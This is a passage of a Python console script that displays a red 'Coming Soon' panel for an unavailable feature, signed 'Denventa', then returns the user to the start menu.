        f'   {P2}Sorry, Features {konten} Not Available For Now. Wait for the next update to use the upcoming features. Thank you.\n\n                {M2}- Denventa -')
    printer(Panel(tamp_kesediaan, title=f'{M2}[  {P2}Coming  Soon  {M2}]', title_align='center',
            subtitle=f'{M2}[  {P2}See  You  {M2}]', subtitle_align='center', width=54, padding=(1, 4), style='#FF0000'))
    input(
        '\n\n               %s[ %sReturn to Start Menu %s]              ' % (H, P, H))
    tampilan_menu()
